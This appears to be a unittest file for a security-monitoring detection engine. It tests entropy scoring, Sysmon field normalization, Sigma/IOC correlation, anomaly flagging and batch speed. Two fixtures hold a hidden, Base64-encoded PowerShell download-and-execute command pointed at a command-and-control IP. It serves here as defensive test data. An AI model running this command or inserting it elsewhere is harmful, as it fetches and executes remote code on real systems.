"""
NetraShield SOC 2.4.0 Automated Unittest Suite
Verifies:
1. Shannon entropy distinction (benign < 3.6 vs. Base64 PowerShell > 4.2)
2. ECS normalization (Sysmon fields map cleanly to ECS keys)
3. Sigma and IOC correlation (Encoded PowerShell + C2 IP 185.220.101.42 -> CRITICAL alert > 90 with T1059.001)
4. Isolation Forest outlier (novel high-entropy command without Sigma keywords flagged as anomaly)
5. Batch throughput benchmark (10,000 synthetic events evaluated in < 3.0 seconds)
"""
import unittest
import time
import sys
import os

# Ensure backend is on sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "backend")))

from netrashield.parser import calculate_shannon_entropy, ECSNormalizer, generate_synthetic_attack_telemetry
from netrashield.core_engine import CorrelationEngine
from netrashield.options import DetectionOptions


class TestNetraShield(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.engine = CorrelationEngine(
            rules_dir="rules/sigma",
            ioc_store_path="intel/ioc_store.json",
            options=DetectionOptions()
        )

    def test_shannon_entropy_distinction(self):
        """
        Verify benign command line entropy is < 3.6,
        while Base64-encoded PowerShell payload entropy is > 4.2.
        """
        benign_cmd = "svchost.exe -k netsvcs"
        base64_psh = (
            "powershell.exe -NoP -NonI -W Hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaHR0cDovLzE4NS4yMjAuMTAxLjQyOjgwODAvYmVhY29uLnBzMScp"
        )

        benign_entropy = calculate_shannon_entropy(benign_cmd)
        psh_entropy = calculate_shannon_entropy(base64_psh)

        self.assertLess(
            benign_entropy, 3.6,
            f"Expected benign entropy < 3.6, got {benign_entropy}"
        )
        self.assertGreater(
            psh_entropy, 4.2,
            f"Expected Base64 PowerShell entropy > 4.2, got {psh_entropy}"
        )

    def test_ecs_normalization(self):
        """
        Verify Sysmon raw dictionary maps cleanly to ECS keys.
        """
        raw_sysmon = {
            "UtcTime": "2026-11-24 15:30:00.000",
            "EventID": "1",
            "Computer": "FINANCE-PC01.CORP.LOCAL",
            "User": "CORP\\jsmith",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c whoami",
            "ProcessId": "4128",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "ParentCommandLine": "explorer.exe",
            "DestinationIp": "192.168.1.50",
            "DestinationPort": "445",
            "Hashes": "SHA256=275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F"
        }

        ecs = ECSNormalizer.normalize_sysmon_dict(raw_sysmon)

        self.assertEqual(ecs["host"]["name"], "FINANCE-PC01.CORP.LOCAL")
        self.assertEqual(ecs["process"]["executable"], "C:\\Windows\\System32\\cmd.exe")
        self.assertEqual(ecs["process"]["command_line"], "cmd.exe /c whoami")
        self.assertEqual(ecs["process"]["parent"]["executable"], "C:\\Windows\\explorer.exe")
        self.assertEqual(ecs["destination"]["ip"], "192.168.1.50")
        self.assertEqual(ecs["destination"]["port"], 445)
        self.assertIn("sha256", ecs["process"]["hash"])
        self.assertGreater(ecs["process"]["entropy"], 0.0)

    def test_sigma_and_ioc_correlation(self):
        """
        Verify Encoded PowerShell + C2 IP 185.220.101.42 raises CRITICAL alert > 90 with T1059.001.
        """
        raw_attack = {
            "EventID": "1",
            "Computer": "FINANCE-PC04",
            "User": "FINANCE\\j.smith",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaHR0cDovLzE4NS4yMjAuMTAxLjQyOjgwODAvYmVhY29uLnBzMScp",
            "DestinationIp": "185.220.101.42",
            "DestinationPort": 8080,
            "Hashes": "SHA256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
        }

        ecs_event = ECSNormalizer.normalize_sysmon_dict(raw_attack)
        res = self.engine.process_batch([ecs_event], min_risk_threshold=10.0)
        alerts = res["alerts"]

        self.assertGreater(len(alerts), 0, "No alerts generated for attack event")
        top_alert = alerts[0]
        self.assertEqual(top_alert["severity"], "CRITICAL")
        self.assertGreater(top_alert["risk_score"], 90.0)
        self.assertEqual(top_alert["mitre_id"], "T1059.001")
        self.assertIn("185.220.101.42", top_alert["dest_ip"])

    def test_isolation_forest_outlier(self):
        """
        Verify novel high-entropy command without any Sigma keywords is flagged as anomaly.
        """
        novel_anomaly = {
            "EventID": "1",
            "Computer": "RESEARCH-WS09",
            "User": "CORP\\devuser",
            "Image": "C:\\Temp\\custom_packed_binary_xyz.exe",
            # Novel high-entropy, heavily randomized argument payload without Sigma keywords
            "CommandLine": "custom_packed_binary_xyz.exe " + "q8X!k9#mZ$vW^2pL&rT*9bC(xV)zM_0aQ+wE=rY%tU@1oI~3uO?7iP" * 10,
            "DestinationIp": "10.0.0.99",
            "DestinationPort": 55432,
            "Hashes": ""
        }

        ecs_event = ECSNormalizer.normalize_sysmon_dict(novel_anomaly)
        # Ensure it has high entropy
        self.assertGreater(ecs_event["shannon_entropy"], 4.5)

        res = self.engine.process_batch([ecs_event], min_risk_threshold=10.0)
        self.assertGreater(len(res["alerts"]), 0, "Novel outlier not flagged")
        alert = res["alerts"][0]
        self.assertGreaterEqual(alert["risk_score"], 50.0)
        self.assertIn(alert["severity"], ["HIGH", "CRITICAL", "MEDIUM"])

    def test_batch_throughput_benchmark(self):
        """
        Verify 10,000 synthetic events are evaluated in < 3.0 seconds.
        """
        n_events = 10000
        # Generate synthetic events
        base_events = [
            {"Computer": "PC-01", "Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "svchost.exe -k netsvcs", "DestinationPort": 0},
            {"Computer": "PC-02", "Image": "C:\\Program Files\\Chrome\\chrome.exe", "CommandLine": "chrome.exe --no-sandbox", "DestinationPort": 443},
            {"Computer": "PC-03", "Image": "C:\\Windows\\explorer.exe", "CommandLine": "explorer.exe", "DestinationPort": 0},
            {"Computer": "PC-04", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -enc AAAA", "DestinationPort": 8080},
        ]
        
        test_events = []
        for i in range(n_events):
            b = dict(base_events[i % len(base_events)])
            b["Computer"] = f"PC-{i % 50}"
            test_events.append(b)

        t0 = time.time()
        result = self.engine.process_batch(test_events, min_risk_threshold=40.0)
        elapsed = time.time() - t0

        self.assertEqual(result["total_events"], 10000)
        self.assertLess(
            elapsed, 3.0,
            f"Throughput benchmark failed: took {elapsed:.2f}s for 10,000 events (expected < 3.0s)"
        )


if __name__ == "__main__":
    unittest.main()
